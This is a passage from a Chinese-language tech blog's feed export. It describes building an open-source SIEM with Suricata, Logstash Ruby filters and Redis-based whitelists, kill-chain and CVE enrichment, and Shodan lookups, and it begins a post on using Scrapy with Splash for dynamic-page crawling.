class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@cdn_db</span>.exists?(src_ip) <span class="params">||</span> <span class="variable">@cdn_db</span>.exists?(dst_ip) <span class="params">||</span> <span class="variable">@scan_db</span>.exists?(src_ip) <span class="params">||</span> <span class="variable">@scan_db</span>.exists?(dst_ip) <span class="keyword">then</span></span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h5 id="4-1-2-filter-sid-from-alert"><a href="#4-1-2-filter-sid-from-alert" class="headerlink" title="4.1.2 filter_sid_from_alert"></a>4.1.2 filter_sid_from_alert</h5><h6 id="Logstash-Config-15"><a href="#Logstash-Config-15" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/80_add-siem_events.conf">filter_sid_from_alert.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        <span class="built_in">clone</span> &#123;</span><br><span class="line">            clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-filter_sid.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">                <span class="string">&quot;sid_db&quot;</span> =&gt; 2</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-7"><a href="#Ruby-Code-7" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-filter_sid.rb">filter_sid_from_alert.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@signature_id</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;sid_db&quot;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    sid = event.get(<span class="string">&quot;[rule][id]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@signature_id</span>.exists?(sid) <span class="keyword">then</span></span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-2-alarm-from-siem"><a href="#4-2-alarm-from-siem" class="headerlink" title="4.2 alarm_from_siem"></a>4.2 alarm_from_siem</h4><h5 id="4-2-1-update-action-from-alarm"><a href="#4-2-1-update-action-from-alarm" class="headerlink" title="4.2.1 update_action_from_alarm"></a>4.2.1 update_action_from_alarm</h5><p>​        更新匹配到的<code>rule.id</code>事件，将<code>event.action</code>值更新为：<code>block</code>。便于后期被SIEM联动模块“消费”。如上图中红色线所示部分。主要是为了通过<code>event.action</code>字段来区分SIEM做的自动化操作。</p>
<h6 id="Logstash-Config-16"><a href="#Logstash-Config-16" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_update-siem_action.conf">update-action_from_alarm.conf</a></strong></li>
</ul>
<p>​    针对指定<code>rule.id</code>事件，将<code>allowed</code>值更新为：<code>block</code>。便于后期被联动模块“消费”。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">        update =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;[event][action]&quot;</span> =&gt; <span class="string">&quot;allowed&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ruby &#123;</span><br><span class="line">        path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-update_action.rb&quot;</span></span><br><span class="line">        script_params =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">            <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">            <span class="string">&quot;siem_action_db&quot;</span> =&gt; 7</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-8"><a href="#Ruby-Code-8" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-update_action.rb">update_action_from_alarm.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="variable">@siem_action_db</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;siem_action_db&quot;</span>])</span><br><span class="line">    <span class="keyword">rescue</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    rule_id = event.get(<span class="string">&quot;[rule][id]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@siem_action_db</span>.exists?(rule_id) <span class="keyword">then</span></span><br><span class="line">        event.set(<span class="string">&quot;[event][action]&quot;</span>, <span class="string">&quot;block&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="示例："><a href="#示例：" class="headerlink" title="示例："></a><strong>示例：</strong></h6><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/update_action-0.1.png" alt="image-20201207111416997"></p>
<hr>
<h2 id="3-仪表盘"><a href="#3-仪表盘" class="headerlink" title="3. 仪表盘"></a>3. 仪表盘</h2><h3 id="SIEM的告警仪表盘"><a href="#SIEM的告警仪表盘" class="headerlink" title="SIEM的告警仪表盘"></a>SIEM的告警仪表盘</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/SIEM-Alarm.png" alt="SIEM-Alarm"></p>
<h3 id="安全事件仪表盘-安全溯源"><a href="#安全事件仪表盘-安全溯源" class="headerlink" title="安全事件仪表盘 (安全溯源)"></a>安全事件仪表盘 (安全溯源)</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/SIEM-Alert.png" alt="SIEM Alert"></p>
<h3 id="敏感接口监控"><a href="#敏感接口监控" class="headerlink" title="敏感接口监控"></a>敏感接口监控</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/login_audit.png" alt="image-20201214112856076"></p>
]]></content>
      <categories>
        <category>SIEM</category>
      </categories>
      <tags>
        <tag>SIEM</tag>
      </tags>
  </entry>
  <entry>
    <title>致我心中的 “散装”（开源）SIEM（二）</title>
    <url>/2021/02/02/SIEM%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>XXX</p>
<hr>
<h1 id="SIEM-v0-2-的不足"><a href="#SIEM-v0-2-的不足" class="headerlink" title="SIEM v0.2 的不足"></a>SIEM v0.2 的不足</h1><p>XXX</p>
<hr>
<h1 id="SIEM-v0-3-的改进"><a href="#SIEM-v0-3-的改进" class="headerlink" title="SIEM v0.3 的改进"></a>SIEM v0.3 的改进</h1><h2 id="1-Workflow"><a href="#1-Workflow" class="headerlink" title="1. Workflow"></a>1. Workflow</h2><p>XXX</p>
<hr>
<h2 id="2-Normalized"><a href="#2-Normalized" class="headerlink" title="2. Normalized"></a>2. Normalized</h2><h3 id="Workflow"><a href="#Workflow" class="headerlink" title="Workflow"></a>Workflow</h3><p>![image-20220218183243830](/Users/canon/Library/Application Support/typora-user-images/image-20220218183243830.png)</p>
<h3 id="Configure"><a href="#Configure" class="headerlink" title="Configure"></a>Configure</h3><table>
<thead>
<tr>
<th>No</th>
<th>File</th>
<th>Script</th>
<th>Log</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>60_normalized-general.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>61_normalized-alert.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>62_normalized-flow.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>63_normalized-fileinfo.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>64_normalized-http.conf</td>
<td>64_normalized-http.rb</td>
<td>64_normalized-http.log</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>65_normalized-tls.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="3-Enrichment"><a href="#3-Enrichment" class="headerlink" title="3. Enrichment"></a>3. Enrichment</h2><h3 id="Workflow-1"><a href="#Workflow-1" class="headerlink" title="Workflow"></a>Workflow</h3><p>![image-20220221134544143](/Users/canon/Library/Application Support/typora-user-images/image-20220221134544143.png)</p>
<h3 id="Configure-1"><a href="#Configure-1" class="headerlink" title="Configure"></a>Configure</h3><table>
<thead>
<tr>
<th>No</th>
<th>File</th>
<th>Script</th>
<th>Log</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>70_enrichment-general-geo-1-private_ip.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>70_enrichment-general-geo-2-public_ip.conf</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>71_enrichment-alert-1-direction.conf</td>
<td>71_enrichment-alert-1-direction.rb</td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>71_enrichment-alert-2-killChain.conf</td>
<td>71_enrichment-alert-2-killChain.rb</td>
<td>71_enrichment-alert-2-killChain.log</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>71_enrichment-alert-3-cve.conf</td>
<td>71_enrichment-alert-3-cve.rb</td>
<td>71_enrichment-alert-3-cve.log</td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>71_enrichment-alert-4-whitelist_ip.conf</td>
<td>71_enrichment-alert-4-whitelist_ip.rb</td>
<td>71_enrichment-alert-4-whitelist_ip.log</td>
<td>****</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h4 id="KillChain"><a href="#KillChain" class="headerlink" title="KillChain"></a>KillChain</h4><h5 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a>Suricata</h5><p><strong>Imput</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># key: str killchain:&#123;provider&#125;:&#123;rule id&#125;</span></span><br><span class="line"><span class="comment"># value: json str &#123;&quot;steps&quot;=&gt;&#123;KillChain steps&#125;, &quot;description&quot;=&gt;&#123;KillChain description&#125;, &quot;class&quot;=&gt;&#123;rule class&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> killchain:suricata:2028933 <span class="string">&#x27;&#123;&quot;steps&quot;: 4, &quot;description&quot;: &quot;Exploitation&quot;, &quot;class&quot;=&gt;exploit&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;killchain&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;steps&quot;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;侦查跟踪&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;class&quot;</span>: <span class="string">&quot;scan&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Imperva"><a href="#Imperva" class="headerlink" title="Imperva"></a>Imperva</h5><h4 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h4><p><strong>Input</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># key: str enrichment:&#123;class&#125;:&#123;cve&#125;</span></span><br><span class="line"><span class="comment"># value: str &#123;create time create user&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> enrichment:cve:CVE-2016-8618 <span class="string">&#x27;2022-02-16 Canon&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;rule&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;cve&quot;</span>: <span class="string">&quot;CVE-2015-9381&quot;</span> <span class="comment">// none</span></span><br><span class="line">    &#125;,</span><br><span class="line">  	<span class="attr">&quot;vulnerability&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;CVE-2015-9381&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;enumeration&quot;</span>: <span class="string">&quot;CVE&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-ThreatIntel"><a href="#4-ThreatIntel" class="headerlink" title="4. ThreatIntel"></a>4. ThreatIntel</h2><h3 id="Workflow-2"><a href="#Workflow-2" class="headerlink" title="Workflow"></a>Workflow</h3><p>![image-20220221105601713](/Users/canon/Library/Application Support/typora-user-images/image-20220221105601713.png)</p>
<h3 id="Configure-2"><a href="#Configure-2" class="headerlink" title="Configure"></a>Configure</h3><h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><table>
<thead>
<tr>
<th>No</th>
<th>File</th>
<th>Script</th>
<th>Log</th>
<th>Note</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>85_threatintel-siem-event-1-shodan.conf</td>
<td>85_threatintel-siem-event-1-shodan.rb</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>Input</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># key: list spider:&#123;provider&#125;:ioc</span></span><br><span class="line"><span class="comment"># value: str ioc</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; LPUSH spider:shodan:ioc 8.8.8.8 <span class="comment"># Spider Queue</span></span><br><span class="line">localhost:6379&gt; SETEX alert:8.8.8.8 86400 <span class="literal">true</span> <span class="comment"># IoC Cache</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;84.17.52.20&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hunting&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;details&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;tcp&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;http-simple-new&quot;</span>: <span class="number">81</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https&quot;</span>: <span class="number">443</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;http-simple-new&quot;</span>: <span class="number">8080</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https-simple-new&quot;</span>: <span class="number">8081</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https&quot;</span>: <span class="number">8443</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;https-simple-new&quot;</span>: <span class="number">9002</span></span><br><span class="line">                    &#125;</span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">&quot;udp&quot;</span>: []</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">&quot;domains&quot;</span>: <span class="string">&quot;cdn77.com&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;hostnames&quot;</span>: <span class="string">&quot;unn-84-17-52-20.cdn77.com&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;ports&quot;</span>: [</span><br><span class="line">                <span class="number">8443</span>,</span><br><span class="line">                <span class="number">8081</span>,</span><br><span class="line">                <span class="number">9002</span>,</span><br><span class="line">                <span class="number">8080</span>,</span><br><span class="line">                <span class="number">81</span>,</span><br><span class="line">                <span class="number">443</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;services&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;https&quot;</span>,</span><br><span class="line">                <span class="string">&quot;https-simple-new&quot;</span>,</span><br><span class="line">                <span class="string">&quot;http-simple-new&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3-Filter"><a href="#3-Filter" class="headerlink" title="3. Filter"></a>3. Filter</h2><h3 id="3-1-Whitelist"><a href="#3-1-Whitelist" class="headerlink" title="3.1 Whitelist"></a>3.1 Whitelist</h3><h4 id="3-1-1-IP"><a href="#3-1-1-IP" class="headerlink" title="3.1.1 IP"></a>3.1.1 IP</h4><ul>
<li>Redis template</li>
</ul>
<p><strong>Input</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># key: str whitelist:&#123;class&#125;:&#123;ip&#125;</span></span><br><span class="line"><span class="comment"># value: json str &#123;&quot;type&quot;: &quot;cdn&quot;, &quot;action&quot;: &quot;pass|drop&quot;&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> whitelist:ip:8.8.8.8 <span class="string">&#x27;&#123;&quot;type&quot;: &quot;cdn&quot;, &quot;action&quot;: &quot;pass&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>Output</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;whitelist&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cdn&quot;</span>, <span class="comment">// 描述白名单类型，如：CDN、红队测试IP、办公网出口IP</span></span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;drop&quot;</span>, <span class="comment">// drop|pass 事件是否需要进入SIEM消费</span></span><br><span class="line">        <span class="attr">&quot;origin&quot;</span>: <span class="string">&quot;source&quot;</span> <span class="comment">// source|destination 描述实际匹配到白名单来源是&quot;source&quot;还是&quot;destination&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span> <span class="comment">// 仅作为筛选条件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Differences</strong></p>
<ul>
<li>v0.2</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span>,</span><br><span class="line">      	<span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      	<span class="attr">&quot;whitelistType&quot;</span>: <span class="string">&quot;exit_whitelist&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;destination.&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;y.y.y.y&quot;</span>,</span><br><span class="line">      	<span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      	<span class="attr">&quot;whitelistType&quot;</span>: <span class="string">&quot;exit_whitelist&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>v0.3</li>
</ul>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;x.x.x.x&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;whitelist&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;cdn&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;drop&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;origin&quot;</span>: <span class="string">&quot;source&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;isWhitelist&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-1-2-Rule"><a href="#3-1-2-Rule" class="headerlink" title="3.1.2 Rule"></a>3.1.2 Rule</h4><h5 id="3-1-2-1-SID"><a href="#3-1-2-1-SID" class="headerlink" title="3.1.2.1 SID"></a>3.1.2.1 SID</h5><ul>
<li>Redis template</li>
</ul>
<p><strong>Input</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># key: str whitelist:&#123;class&#125;:&#123;provider&#125;:&#123;rule id&#125;</span></span><br><span class="line"><span class="comment"># value: str &#123;rule name&#125;</span></span><br><span class="line"></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> whitelist:sid:suricata:2101201 <span class="string">&quot;GPLWEB_SERVER_403_Forbidden&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Workflow</strong></p>
<p>![image-20220224143316558](/Users/canon/Library/Application Support/typora-user-images/image-20220224143316558.png)</p>
<p><strong>Input</strong></p>
<ul>
<li>Redis template</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># key: str whitelist:&#123;class&#125;:&#123;provider&#125;:&#123;rule name&#125;</span></span><br><span class="line"><span class="comment"># value: str add by &#123;user&#125; &#123;date&#125; &#123;sid&#125; # default</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Suricata</span></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> <span class="string">&quot;whitelist:rule:suricata:GPLWEB_SERVER_403_Forbidden&quot;</span> <span class="string">&quot;add by Canon 2022.02.24 2101201&quot;</span></span><br><span class="line"><span class="comment"># Imperva</span></span><br><span class="line">localhost:6379&gt; <span class="built_in">set</span> <span class="string">&quot;whitelist:rule:imperva:Suspicious Response Code&quot;</span> <span class="string">&quot;add by Canon 2022.02.24&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Workflow</strong></p>
<p>![image-20220224150916372](/Users/canon/Library/Application Support/typora-user-images/image-20220224150916372.png)</p>
]]></content>
      <categories>
        <category>SIEM</category>
      </categories>
      <tags>
        <tag>SIEM</tag>
      </tags>
  </entry>
  <entry>
    <title>Scrapy + Splash 实现动态网页爬取</title>
    <url>/2019/10/08/Scrapy%20+%20Splash%20%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E7%88%AC%E5%8F%96/</url>
    <content><![CDATA[<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>​        这是一个撞库事件的后续, 通过之前编写的脚本<strong>Suricata - login_audit</strong>脚本成功审计到了所有登录网站的账号。这里需要对经过分析后存在可疑行为的账号进行反向查询, 主要判断该账号是否已被标记为泄露账号。</p>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>​        由于<strong>Scrapy</strong>没有<strong>JS Eengine</strong>只能爬取静态页面的, 对于JS生成的动态页面是不支持的。但是可以借助<a href="https://github.com/scrapy-plugins/scrapy-splash"><strong>Scrapy-Splash</strong></a>来实现动态页面的爬取。</p>
<h1 id="部署方法"><a href="#部署方法" class="headerlink" title="部署方法"></a>部署方法</h1><h2 id="1-Scrapy-Splash"><a href="#1-Scrapy-Splash" class="headerlink" title="1. Scrapy-Splash"></a>1. Scrapy-Splash</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install scrapy-splash --user</span><br></pre></td></tr></table></figure>



<h2 id="2-Splash-Instance"><a href="#2-Splash-Instance" class="headerlink" title="2. Splash Instance"></a>2. Splash Instance</h2><p>由于<strong>Scrapy-Splash</strong>使用的是<strong>Splash HTTP API</strong>， 所以需要一个**<a href="https://splash.readthedocs.io/en/stable/install.html">Splash Instance</a><strong>，一般采用</strong><a href="https://hub.docker.com/r/scrapinghub/splash">Docker</a><strong>运行</strong>Splash**。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more docker-compose.yml</span><br><span class="line">version: <span class="string">&quot;2.0&quot;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  splash:</span><br><span class="line">    restart: always</span><br><span class="line">    image: scrapinghub/splash</span><br><span class="line">    tty: <span class="literal">true</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8050:8050&quot;</span></span><br><span class="line">    network_mode: <span class="string">&quot;bridge&quot;</span></span><br><span class="line">    container_name: <span class="string">&quot;Splash&quot;</span></span><br><span class="line">    hostname: <span class="string">&quot;Splash&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="3-配置Splash服务（以下操作全部在settings-py）"><a href="#3-配置Splash服务（以下操作全部在settings-py）" class="headerlink" title="3. 配置Splash服务（以下操作全部在settings.py）"></a>3. 配置<a href="https://github.com/scrapy-plugins/scrapy-splash"><strong>Splash</strong></a>服务（以下操作全部在<strong>settings.py</strong>）</h2><p><strong>3.1    添加Splash服务器地址</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SPLASH_URL = <span class="string">&#x27;http://localhost:8050&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>3.2    启用Splash middleware</strong></p>
